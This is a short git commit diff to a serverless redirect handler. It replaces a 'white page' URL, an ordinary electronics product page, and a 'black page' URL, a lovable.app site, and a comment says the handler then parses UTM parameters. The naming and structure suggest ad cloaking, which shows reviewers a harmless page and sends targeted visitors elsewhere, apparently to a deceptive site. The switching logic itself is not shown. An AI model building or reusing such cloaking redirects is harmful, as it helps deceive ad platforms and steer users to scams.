541064f48cef44568aba0e38c7edfae756037086
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-20 07:59:16 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://mastershop.com.au/collections/power-bank/products/otterbox-fast-charge-power-bank-wireless-qi-usb-c-usb-a-10k-mah-black";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://www.maxonpakistan.com/products/ck-7-double-usb-fast-charger";
+    const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
